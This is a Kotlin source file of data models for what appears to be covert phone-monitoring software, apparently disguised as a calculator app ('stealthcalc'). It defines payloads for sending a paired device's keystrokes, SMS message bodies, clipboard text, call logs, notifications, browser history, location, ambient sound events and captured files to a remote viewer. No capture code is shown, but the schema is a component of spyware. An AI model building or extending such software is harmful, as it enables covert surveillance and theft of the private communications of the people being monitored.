package com.stealthcalc.monitoring.model

import kotlinx.serialization.Serializable

@Serializable
data class EventBatch(
    val deviceId: String,
    val events: List<EventPayload>,
)

@Serializable
data class EventPayload(
    val id: String,
    val kind: String,
    val payload: String,
    val capturedAt: Long,
)

@Serializable
data class PairRequest(
    val otp: String,
    val deviceName: String,
)

@Serializable
data class PairResponse(
    val deviceId: String,
    val token: String,
)

@Serializable
data class DeviceState(
    val deviceId: String,
    val deviceName: String,
    val lastSeen: Long,
    val currentApp: String? = null,
    val batteryLevel: Int? = null,
    val isCharging: Boolean? = null,
    val wifiSsid: String? = null,
    val isScreenOn: Boolean? = null,
    val latitude: Double? = null,
    val longitude: Double? = null,
)

@Serializable
data class AppUsagePayload(
    val packageName: String,
    val appName: String? = null,
    val event: String,
    val timestampMs: Long,
)

@Serializable
data class BatteryPayload(
    val level: Int,
    val scale: Int,
    val isCharging: Boolean,
    val plugType: String,
    val temperature: Int,
    val voltage: Int,
)

@Serializable
data class NetworkPayload(
    val type: String,
    val ssid: String? = null,
    val bssid: String? = null,
    val connected: Boolean,
)

@Serializable
data class AppInstallPayload(
    val packageName: String,
    val action: String,
    val appName: String? = null,
    val versionName: String? = null,
)

@Serializable
data class NotificationPayload(
    val packageName: String,
    val appName: String? = null,
    val title: String? = null,
    val text: String? = null,
    val category: String? = null,
    val postedAt: Long,
)

@Serializable
data class LocationPayload(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val provider: String? = null,
)

@Serializable
data class ScreenEventPayload(
    val event: String,
    val timestampMs: Long,
)

@Serializable
data class CallLogPayload(
    val number: String,
    val contactName: String? = null,
    val type: String,
    val duration: Int,
    val date: Long,
)

@Serializable
data class SmsPayload(
    val address: String,
    val contactName: String? = null,
    val body: String,
    val type: String,
    val date: Long,
)

@Serializable
data class MediaAddedPayload(
    val displayName: String,
    val relativePath: String? = null,
    val mimeType: String? = null,
    val sizeBytes: Long,
    val dateAdded: Long,
    val width: Int? = null,
    val height: Int? = null,
    val mediaType: String,
)

@Serializable
data class SecurityEventPayload(
    val event: String,
    val details: String? = null,
    val timestampMs: Long,
)

@Serializable
data class ClipboardPayload(
    val text: String,
    val timestampMs: Long,
)

@Serializable
data class WifiHistoryPayload(
    val ssid: String,
    val bssid: String? = null,
    val signalLevel: Int? = null,
    val frequency: Int? = null,
    val ipAddress: String? = null,
    val linkSpeed: Int? = null,
    val connected: Boolean,
    val timestampMs: Long,
)

@Serializable
data class BrowserHistoryPayload(
    val url: String,
    val title: String? = null,
    val visitTime: Long,
    val browser: String,
)

@Serializable
data class SimChangePayload(
    val simState: String,
    val carrierId: String? = null,
    val carrierName: String? = null,
    val countryIso: String? = null,
    val phoneNumber: String? = null,
    val simSlot: Int? = null,
    val timestampMs: Long,
)

@Serializable
data class DeviceInfoPayload(
    val totalStorage: Long,
    val freeStorage: Long,
    val totalRam: Long,
    val freeRam: Long,
    val runningApps: Int,
    val uptimeMs: Long,
    val androidVersion: String,
    val model: String,
    val manufacturer: String,
    val timestampMs: Long,
)

@Serializable
data class DataUsagePayload(
    val packageName: String,
    val appName: String? = null,
    val txBytes: Long,
    val rxBytes: Long,
    val period: String,
)

@Serializable
data class CalendarEventPayload(
    val title: String,
    val description: String? = null,
    val location: String? = null,
    val startTime: Long,
    val endTime: Long,
    val calendarName: String? = null,
    val allDay: Boolean = false,
)

@Serializable
data class GeofencePayload(
    val zoneName: String,
    val event: String,
    val latitude: Double,
    val longitude: Double,
    val timestampMs: Long,
)

@Serializable
data class InstalledAppPayload(
    val packageName: String,
    val appName: String,
    val versionName: String? = null,
    val versionCode: Long = 0,
    val installedAt: Long? = null,
    val updatedAt: Long? = null,
    val isSystemApp: Boolean = false,
)

@Serializable
data class AmbientSoundPayload(
    val peakAmplitude: Int,
    val durationMs: Long,
    val triggered: Boolean,
    val timestampMs: Long,
)

@Serializable
data class ContactFrequencyPayload(
    val contactName: String? = null,
    val identifier: String,
    val callCount: Int = 0,
    val smsCount: Int = 0,
    val totalDurationSecs: Int = 0,
    val lastContact: Long = 0,
)

@Serializable
data class StepCountPayload(
    val steps: Int,
    val periodMinutes: Int,
    val timestampMs: Long,
)

@Serializable
data class SensorDataPayload(
    val proximityNear: Boolean? = null,
    val lightLevel: Float? = null,
    val isMoving: Boolean? = null,
    val accelerometerMagnitude: Float? = null,
    val timestampMs: Long,
)

@Serializable
data class AppPermissionPayload(
    val packageName: String,
    val appName: String,
    val permissions: List<String>,
    val dangerousGranted: List<String>,
)

@Serializable
data class KeystrokePayload(
    val packageName: String,
    val appName: String? = null,
    val text: String,
    val fieldId: String? = null,
    val timestampMs: Long,
)

@Serializable
data class RemoteFile(
    val fileId: String,
    val deviceId: String,
    val fileName: String,
    val mimeType: String,
    val sizeBytes: Long,
    val category: String,
    val uploadedAt: Long,
    val capturedAt: Long? = null,
)

@Serializable
data class FileListResponse(
    val files: List<RemoteFile>,
    val total: Int,
)
